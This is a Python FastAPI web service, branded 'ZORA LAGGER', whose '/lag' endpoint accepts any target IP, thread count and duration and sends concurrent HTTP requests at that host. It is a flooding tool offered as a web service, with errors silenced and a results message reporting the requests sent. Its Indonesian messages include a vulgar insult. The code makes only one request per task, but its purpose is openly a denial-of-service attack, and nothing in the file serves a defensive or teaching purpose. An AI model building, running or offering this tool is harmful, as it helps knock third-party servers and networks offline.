from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import httpx
import asyncio
import time
import uvicorn

app = FastAPI()

# Serve index.html sebagai root
@app.get("/", response_class=HTMLResponse)
async def root():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

# Endpoint flood / lagger
@app.get("/lag")
async def lag(ip: str = Query(...), threads: int = Query(50), duration: int = Query(60)):
    if not ip:
        return "IP kosong kontol!"

    start_time = time.time()
    count = 0

    async def send():
        nonlocal count
        async with httpx.AsyncClient(timeout=5.0) as client:
            try:
                # Coba GET ke http://IP (port 80 default, atau tambah port kalau mau)
                await client.get(f"http://{ip}", follow_redirects=True)
                count += 1
            except:
                pass  # silent fail

    tasks = [asyncio.create_task(send()) for _ in range(threads)]
    await asyncio.sleep(duration)
    for t in tasks:
        t.cancel()

    elapsed = time.time() - start_time
    return f"[ZORA LAGGER] Selesai!\nRequests terkirim: {count}\nDurasi real: {elapsed:.1f}s\nTarget IP: {ip}"

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
